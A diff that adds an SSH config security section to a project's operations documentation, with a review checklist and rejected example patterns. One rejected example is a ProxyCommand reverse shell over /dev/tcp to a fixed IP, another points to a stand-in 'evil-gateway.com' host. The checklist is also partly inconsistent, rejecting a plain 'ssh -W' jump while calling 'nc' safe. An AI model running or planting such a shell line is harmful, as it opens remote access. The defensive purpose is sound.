@@ -376,6 +376,99 @@ journalctl -u open-ace -n 100
    - 配置日志监控
    - 设置告警阈值
 
+## SSH Config File Security Requirements (Issue #2328)
+
+### Default Behavior
+
+SSH config files (`config`, `config_*`) are **DENIED by default** and included in the denylist. This prevents propagation of potentially dangerous SSH configurations that could contain:
+- `ProxyCommand` directives with shell execution
+- `IdentityFile` directives pointing to root private keys
+- Hardcoded credentials or tokens
+- `Include` directives to sensitive paths
+
+### Security Review Process for Config Files
+
+If you need to sync an SSH config file, you **must** add it to the custom whitelist with a mandatory security review. The security review **must** verify:
+
+1. **No ProxyCommand with shell execution**
+   - ❌ REJECT: `ProxyCommand ssh -q -W %h:%p gateway.example.com`
+   - ❌ REJECT: `ProxyCommand bash -c "exec 3<>/dev/tcp/10.0.0.1/4242; cat <&3 & cat >&3"`
+   - ✅ ACCEPT: No ProxyCommand or only safe ProxyCommand (e.g., `nc %h %p`)
+
+2. **No IdentityFile pointing to root private keys**
+   - ❌ REJECT: `IdentityFile /root/.ssh/id_rsa`
+   - ❌ REJECT: `IdentityFile ~/.ssh/id_ed25519` (where `~` expands to `/root`)
+   - ✅ ACCEPT: No IdentityFile or only safe public key paths
+
+3. **No Include directives to sensitive paths**
+   - ❌ REJECT: `Include /root/.ssh/config.d/*`
+   - ❌ REJECT: `Include ~/.ssh/external_config`
+   - ✅ ACCEPT: No Include or only safe include paths (e.g., `/etc/ssh/ssh_config.d/*`)
+
+4. **No credentials or tokens in config**
+   - ❌ REJECT: Password directives or hardcoded tokens
+   - ❌ REJECT: API keys or authentication credentials
+   - ✅ ACCEPT: No hardcoded credentials
+
+5. **No User directive with root or privileged users**
+   - ❌ REJECT: `User root`
+   - ❌ REJECT: `User admin` or other privileged users
+   - ✅ ACCEPT: Only non-privileged user directives or no User directive
+
+### Example Whitelist Configuration for SSH Config
+
+```yaml
+allowlist:
+  # ... other entries ...
+
+  # Example: Allow specific SSH config with security review
+  - name: "safe_config"
+    type: "ssh_config"
+    content_check: true
+    approval_required: true
+    security_review:
+      reviewed_by: "security-team"  # Must be in authorized reviewers list
+      reviewed_at: "2026-08-08"
+      review_notes: |
+        Verified safe:
+        - No ProxyCommand directives
+        - No IdentityFile directives
+        - No Include directives
+        - No hardcoded credentials
+        - Contains only Host/User/Port directives for known safe hosts
+```
+
+### Rejected Config Patterns (Examples)
+
+**Example 1: ProxyCommand with shell execution**
+```ssh
+# ❌ REJECTED - Security risk
+Host compromised-host
+    ProxyCommand ssh -q -W %h:%p evil-gateway.com
+```
+
+**Example 2: IdentityFile to root key**
+```ssh
+# ❌ REJECTED - Root private key exposure
+Host internal-server
+    IdentityFile /root/.ssh/id_rsa
+```
+
+**Example 3: Include sensitive path**
+```ssh
+# ❌ REJECTED - Path traversal risk
+Include /root/.ssh/external_configs/*
+```
+
+**Example 4: Safe config (acceptable)**
+```ssh
+# ✅ ACCEPTED - Safe configuration
+Host github.com
+    User git
+    Port 22
+    HostName github.com
+```
+
 ## 相关文档
 
 - [SSH 密钥安全边界](./ssh-key-boundary.md)
